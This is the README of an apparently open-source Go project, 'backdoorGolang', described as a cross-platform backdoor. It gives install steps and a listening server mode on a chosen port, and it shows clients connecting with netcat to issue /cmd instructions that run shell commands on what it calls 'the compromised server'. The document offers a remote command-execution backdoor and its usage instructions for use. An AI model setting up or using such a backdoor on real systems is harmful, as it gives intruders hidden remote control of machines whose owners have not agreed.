# backdoorGolang

[![Windows Build Status](https://ci.appveyor.com/api/projects/status/github/pilebones/backdoorGolang?svg=true&branch=master&passingText=Windows%20-%20OK&failingText=Windows%20-%20failed&pendingText=Windows%20-%20pending)](https://ci.appveyor.com/project/pilebones/backdoorGolang)
  
Backdoor with Golang (Cross-Plateform)

_/!\ Work in progress, not a stable release /!\_

##Main goal

A fork of my own project named : "pilebones/backdoorBash" (see: https://github.com/pilebones/backdoorBash) but instead of using Bash as programming language (Unix-like only) this new one will work on Windows too by using a Golang API (cross-plateform) developed from scratch (as much as possible).

## Requirements

- Golang SDK : Compiler and tools for the Go programming language from Google (see: https://golang.org/doc/install)

From Arch Linux :
```bash
(sudo) pacman -S community/go
```

From Debian :
```bash
(sudo) apt-get install golang-go
```

## Installation

```bash
cd $GOPATH
go get github.com/pilebones/backdoorGolang
./bin/backdoorGolang --help

```

## Usage

```bash
./bin/backdoorGolang --help
Usage of ./bin/backdoorGolang:
  -d, --debug         Enable mode debug
  -h, --host string   Set hostname to use (default "localhost")
  -l, --listen        Enable listen mode (server socket mode)
  -p, --port int      Set port number to use (default 9876)
  -v, --verbose       Enable mode verbose
  -V, --version       Display version number
```

## Server-mode

```bash
./bin/backdoorGolang -h localhost -p 1234 -l
```

Notice : Server is multi-user capable (one server for X client)

## Client-mode

/!\ Not implemented yet, use netcat meanwhile !

```bash
netcat localhost 1234
```

### Instructions

Each message submit by client is sent to all backdoor's clients like a chat. 
However, an alone chat's feature is useless, there are a set of instructions allowed by all clients which have different behavior for taking advantage of the compromised server.

#### Quit Instruction

This instruction permit to logout the current user

```bash
/quit
/exit
```
Example :
```bash
echo "/quit"|netcat localhost 1234
```

#### Command Instruction

This instruction permit to execute shell command from server. (OS supported : Linux, Windows)

```bash
/cmd <shell-command>
```
Example :
```bash
echo "/cmd ls -l"|netcat localhost 1234
